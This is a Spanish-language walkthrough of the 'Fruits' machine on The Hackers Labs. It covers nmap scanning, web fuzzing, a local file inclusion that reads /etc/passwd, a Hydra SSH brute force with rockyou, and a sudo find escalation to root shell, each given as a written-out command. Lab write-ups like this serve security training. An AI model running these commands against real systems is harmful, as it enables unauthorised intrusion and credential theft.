---
tags:
  - Cybersecurity
  - Labs
  - TheHackerLabs
  - Easy
  - Linux
  - HTTP
  - FuzzingWeb
  - LFI
  - Hydra
  - SSH
  - PrivilegeEscalation
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#LFI|LFI]]
	- [[#Explotación#Hydra|Hydra]]
	- [[#Explotación#SSH|SSH]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo|Sudo]]

---
# Resolviendo la máquina Fruits

>En esta publicación, comparto cómo resolví la máquina **Fruits** de [The Hackers Labs](https://labs.thehackerslabs.com/machine/38).

---
## Enumeración
### Ping

`ping -c 1 192.168.1.34`

![[Pasted image 20250802180940.png]]

*TTL=63* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.34 -oG allPorts`

![[Pasted image 20250802181042.png]]

`nmap -p22,80 -sCV 192.168.1.34 -oN targeted`

![[Pasted image 20250802181107.png]]
### HTTP

`http://192.168.1.34/`

![[Pasted image 20250802181144.png]]
#### Fuzzing Web

`dirb http://192.168.1.34`

![[Pasted image 20250802181221.png]]

`wfuzz -c --hl=9 -w /usr/share/wordlists/rockyou.txt -u http://192.168.1.34/FUZZ.php`

![[Pasted image 20250802182422.png]]

Se descubre el directorio `fruits`.

---
## Explotación
### LFI

`wfuzz -c --hl=1 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://192.168.1.34/fruits.php?FUZZ=/etc/passwd`

![[Pasted image 20250802182730.png]]

`http://192.168.1.34/fruits.php?file=/etc/passwd`

![[Pasted image 20250802182751.png]]

Al visualizar el archivo `/etc/passwd`, se identifica el usuario `bananaman`.
### Hydra

Se realiza un ataque de fuerza bruta contra el servicio **SSH** (puerto 22), utilizando el usuario `bananaman` identificado anteriormente.

`hydra -l bananaman -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.34 -t 64`

![[Pasted image 20250802183145.png]]
### SSH

Se accede al sistema mediante el servicio **SSH**.

`ssh bananaman@192.168.1.34`

![[Pasted image 20250802183317.png]]
### Escalada de Privilegios
#### Sudo

`sudo -l`

![[Pasted image 20250802183526.png]]

Se encuentra el binario: `/usr/bin/find`, se realiza una búsqueda por [GTFOBins](https://gtfobins.github.io/gtfobins/find/#sudo).

![[Pasted image 20250802183638.png]]

`sudo find . -exec /bin/sh \; -quit`

![[Pasted image 20250802183708.png]]

---